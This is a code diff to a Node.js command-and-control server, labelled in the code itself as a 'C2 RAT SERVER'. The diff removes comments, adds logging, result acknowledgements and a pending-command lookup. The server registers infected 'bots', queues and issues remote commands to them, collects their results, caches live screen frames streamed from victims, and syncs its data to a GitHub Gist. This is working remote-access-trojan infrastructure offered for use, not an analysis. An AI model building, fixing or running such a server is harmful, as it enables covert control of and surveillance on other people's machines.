@@ -58,7 +58,6 @@ const streamCache = new Map();
 //  GITHUB GIST FUNCTIONS
 // ============================================================
 
-// Load from Gist
 async function loadFromGist() {
     if (!gistEnabled) return false;
     try {
@@ -82,7 +81,6 @@ async function loadFromGist() {
     }
 }
 
-// Save to Gist
 async function saveToGist() {
     if (!gistEnabled) return false;
     try {
@@ -108,12 +106,7 @@ async function saveToGist() {
     }
 }
 
-// ============================================================
-//  DATABASE WRAPPER - AUTO SYNC
-// ============================================================
-
 async function saveDB() {
-    // Sync to Gist (bất đồng bộ, không chờ)
     if (gistEnabled) {
         saveToGist().catch(() => {});
     }
@@ -145,7 +138,6 @@ wss.on('connection', (ws, req) => {
             const botId = data.bot_id;
             if (!botId) return;
 
-            // === REGISTER ===
             if (data.type === 'register') {
                 botClients.set(botId, ws);
                 
@@ -169,7 +161,6 @@ wss.on('connection', (ws, req) => {
                 }
                 await saveDB();
 
-                // Gửi pending commands
                 const pendings = DB.pending_commands.filter(p => p.bot_id === botId);
                 pendings.forEach(p => {
                     sendCommand(ws, botId, p.cmd_id, p.command, JSON.parse(p.args || '[]'));
@@ -181,7 +172,6 @@ wss.on('connection', (ws, req) => {
                 ws.send(JSON.stringify({ type: 'registered', bot_id: botId }));
             }
 
-            // === HEARTBEAT ===
             else if (data.type === 'heartbeat') {
                 const bot = DB.bots.find(b => b.bot_id === botId);
                 if (bot) {
@@ -190,32 +180,41 @@ wss.on('connection', (ws, req) => {
                 }
             }
 
-            // === RESULT ===
             else if (data.type === 'result') {
                 console.log(`[RESULT] ${botId}: ${data.cmd_id} -> ${data.status}`);
+                console.log(`[RESULT] Data:`, JSON.stringify(data).slice(0, 200));
                 
-                const cmdIndex = DB.commands.findIndex(c => c.cmd_id === data.cmd_id);
+                // TÌM VÀ CẬP NHẬT COMMAND
+                let cmdIndex = DB.commands.findIndex(c => c.cmd_id === data.cmd_id);
                 if (cmdIndex !== -1) {
                     DB.commands[cmdIndex].result = data.result;
                     DB.commands[cmdIndex].status = data.status || 'ok';
                     DB.commands[cmdIndex].executed_at = Date.now();
-                    await saveDB();
+                    console.log(`[RESULT] ✅ Updated existing command ${data.cmd_id}`);
                 } else {
+                    // NẾU KHÔNG TÌM THẤY, TẠO MỚI
                     DB.commands.push({
                         bot_id: botId,
                         cmd_id: data.cmd_id,
-                        command: 'unknown',
+                        command: data.command || 'unknown',
                         args: '[]',
                         result: data.result,
                         status: data.status || 'ok',
                         issued_at: Date.now(),
                         executed_at: Date.now()
                     });
-                    await saveDB();
+                    console.log(`[RESULT] ⚠️ Created new command entry for ${data.cmd_id}`);
                 }
+                await saveDB();
+                
+                // GỬI PHẢN HỒI CHO BOT
+                ws.send(JSON.stringify({ 
+                    type: 'result_ack', 
+                    cmd_id: data.cmd_id,
+                    status: 'received'
+                }));
             }
 
-            // === RAT STREAM ===
             else if (data.type === 'rat_stream') {
                 streamCache.set(botId, {
                     frame: data.image,
@@ -362,8 +361,30 @@ app.post('/api/command/bulk', auth, async (req, res) => {
 });
 
 app.get('/api/results/:cmd_id', auth, (req, res) => {
-    const cmd = DB.commands.find(c => c.cmd_id === req.params.cmd_id);
-    res.json(cmd || {});
+    const cmdId = req.params.cmd_id;
+    console.log(`[API] Looking for result: ${cmdId}`);
+    
+    // Tìm trong commands
+    let cmd = DB.commands.find(c => c.cmd_id === cmdId);
+    if (cmd) {
+        console.log(`[API] Found result:`, cmd.status);
+        return res.json(cmd);
+    }
+    
+    // Tìm trong pending commands (fallback)
+    const pending = DB.pending_commands.find(p => p.cmd_id === cmdId);
+    if (pending) {
+        console.log(`[API] Found in pending:`, pending);
+        return res.json({
+            cmd_id: pending.cmd_id,
+            result: null,
+            status: 'pending',
+            issued_at: pending.issued_at
+        });
+    }
+    
+    console.log(`[API] Command ${cmdId} not found`);
+    res.json({});
 });
 
 app.get('/api/results/latest/:bot_id', auth, (req, res) => {
@@ -550,14 +571,13 @@ app.get('/style.css', (req, res) => {
 const PORT = process.env.PORT || 3000;
 
 async function startServer() {
-    // Load từ Gist nếu có
     if (gistEnabled) {
         await loadFromGist();
     }
     
     server.listen(PORT, '0.0.0.0', () => {
         console.log('='.repeat(50));
-        console.log('  ✅ C2 RAT SERVER STARTED');
+        console.log('  ✅ C2 RAT SERVER STARTED (FIXED)');
         console.log(`  Port: ${PORT}`);
         console.log(`  Dashboard: http://localhost:${PORT}/`);
         console.log(`  RAT Control: http://localhost:${PORT}/rat`);
